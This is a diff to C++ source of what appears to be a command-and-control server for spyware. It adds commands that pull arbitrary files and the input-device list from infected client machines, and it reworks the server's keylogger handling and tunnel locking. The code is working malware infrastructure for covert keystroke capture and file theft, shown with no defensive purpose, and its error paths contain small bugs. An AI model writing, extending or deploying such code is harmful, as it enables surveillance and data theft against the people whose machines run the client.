@@ -80,6 +80,9 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(KILL_ARG, ARG_TYPE_SET, "-k", "--kill"));
     argument_list_.push_back(Argument(VERBOSITY_ARG, ARG_TYPE_INT, "-v", "--verbosity"));
     argument_list_.push_back(Argument(REMOVE_ARG, ARG_TYPE_SET, "-rm", "--remove"));
+    argument_list_.push_back(Argument(DEV_ARG, ARG_TYPE_INT, "-d", "--dev"));
+    argument_list_.push_back(Argument(OUT_ARG, ARG_TYPE_STRING, "-o", "--out"));
+    argument_list_.push_back(Argument(FILE_NAME_ARG, ARG_TYPE_STRING, "-f", "--file-name"));
 
     command_map_.emplace("help", Command(
         "Show this help message. For specific command help <command> or <command> -h/--help", 
@@ -126,6 +129,20 @@ CommandHandler::CommandHandler(
         this,
         {HELP_ARG},
         {INDEX_ARG, ALL_ARG}
+    ));
+    command_map_.emplace("get-file", Command(
+       "Get a file from the client. Usage: get-file -i <client_index> -f <file_name>. Use -o <output_file_name> to save the file",
+        &CommandHandler::get_file,
+        this,
+        {HELP_ARG},
+        {INDEX_ARG, FILE_NAME_ARG, OUT_ARG}
+    ));
+    command_map_.emplace("get-dev", Command( // basically get-file -f /proc/bus/input/devices
+        "Get the contents of /proc/bus/input/devices from a client and save it. Usage: get-dev -i <client_index>. Use -o <output_file_name> to save the file",
+        &CommandHandler::get_dev,
+        this,
+        {HELP_ARG},
+        {INDEX_ARG, OUT_ARG}
     ));
 }
 
@@ -235,6 +252,14 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
             continue; // Skip INDEX_ARG and ALL_ARG
         }
         if (std::find(found_required_args.begin(), found_required_args.end(), required_arg) == found_required_args.end()) {
+            return -1;
+        }
+    }
+
+    if (temp_arg_map.find(INDEX_ARG) != temp_arg_map.end()) {
+        int index_value = std::any_cast<int>(temp_arg_map[INDEX_ARG]);
+        if (index_value < 0 || index_value >= p_clients_->size()) {
+            *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << index_value << RESET_C2_FIFO;
             return -1;
         }
     }
@@ -380,11 +405,6 @@ void CommandHandler::kill() {
 void CommandHandler::keylogger() {
     int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
 
-    if (p_clients_->at(client_index) == nullptr || ClientHandler::is_client_up(p_clients_->at(client_index)->socket()) < 0) {
-        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Client " << client_index << " is not available" << RESET_C2_FIFO;
-        return;
-    }
-
     Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);
 
     if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
@@ -400,7 +420,10 @@ void CommandHandler::keylogger() {
         if (p_tunnel == nullptr) {
             Keylogger* keylogger = new Keylogger();
             Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, keylogger);
-            p_tunnels_->emplace_back(tunnel);
+            {
+                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+                p_tunnels_->emplace_back(tunnel);
+            }
             try {
                 std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
             } catch (const std::system_error& e) {
@@ -413,12 +436,42 @@ void CommandHandler::keylogger() {
     }
 }
 
+void CommandHandler::get_file() {
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+    std::string file_name = std::any_cast<std::string>(arg_map_[FILE_NAME_ARG]);
+    std::string out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
+
+    if (file_name.size() > MAX_FILE_NAME || out_name.size() > MAX_FILE_NAME) {
+        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::get_file] File names are too big" << RESET_C2_FIFO;
+    }
+
+    PacketTunnel* packet_tunnel = new PacketTunnel(file_name, out_name, p_event_log_, 0);
+    Tunnel* tunnel = new Tunnel(client_index, PACKET_TUNNEL, packet_tunnel);
+    {
+        std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+        p_tunnels_->emplace_back(tunnel);
+    }
+
+    try {
+        std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
+    } catch (const std::system_error& e) {
+        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::get_file] Error creating thread for packet tunnel" << RESET_C2_FIFO;
+        erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
+    }
+}
+
+void CommandHandler::get_dev() {
+    // Receive the /proc/bus/input/devices file from the client
+    arg_map_[FILE_NAME_ARG] =  "/proc/bus/input/devices";
+    get_file();
+}
+
 void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel, int __connection_type) {
     uint port = find_open_port();
     
     if (port > 0 && __p_tunnel->p_spy_tunnel_->init(*p_ip_, port, __p_tunnel->p_tunnel_shutdown_fd_, __connection_type) == 0) {
         send_client(__p_tunnel->command_code_, port-port_, __p_tunnel->client_index_);
-        __p_tunnel->p_spy_tunnel_->edit_path(__p_tunnel->client_index_, __p_tunnel->command_code_);
+        __p_tunnel->p_spy_tunnel_->edit_fifo_path(__p_tunnel->client_index_, __p_tunnel->command_code_);
         Tunnel::active_tunnels_++;
         __p_tunnel->p_spy_tunnel_->run();
     }
